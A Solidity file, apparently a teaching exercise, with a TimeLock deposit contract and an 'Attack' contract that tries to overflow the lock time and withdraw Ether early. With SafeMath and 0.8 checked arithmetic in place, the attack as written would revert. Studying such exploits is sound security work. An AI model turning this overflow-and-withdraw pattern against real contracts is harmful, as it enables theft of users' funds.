// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol"; 

contract TimeLock{

    using SafeMath for uint; 
    
    mapping(address => uint) public balances; 
    mapping(address => uint) public lockTime;  

    function deposit() external payable{

balances[msg.sender] += msg.value; //method2 balances[msg.sender] = balances[msg.sender] + msg.value 
lockTime[msg.sender] = block.timestamp + 1 weeks; 
    }


function increaseLocktime(uint _time) public{
    //lockTime[msg.sender] += _time; for preventive measures, rewrite this code by appending it to add function from SafeMath library 
lockTime[msg.sender] = lockTime[msg.sender].add(_time); 
    }

function withdraw() public{
    require(balances[msg.sender] > 0, "You do not have enough Ether"); 
    require(block.timestamp > lockTime[msg.sender], "The time has not elapsed"); 

    uint bal = balances[msg.sender]; 
    balances[msg.sender] = 0; //nullifying everything that this address' balance has, clear the initial balance 

    (bool sent, ) = msg.sender.call{value: bal}(""); 
    require(sent, "It did not go through"); 
    }  
}

//write an attack contract to breach TimeLock contract 

contract Attack{
    TimeLock public timeLock; 
    constructor(TimeLock _timeLock){
        timeLock = TimeLock(_timeLock); 
    }

fallback() external payable{}

function attack() public payable{
    timeLock.deposit{value: msg.value}(); 

    timeLock.increaseLocktime(
        type(uint).max +1 - timeLock.lockTime(address(this)) ); 

        timeLock.withdraw();

}

}
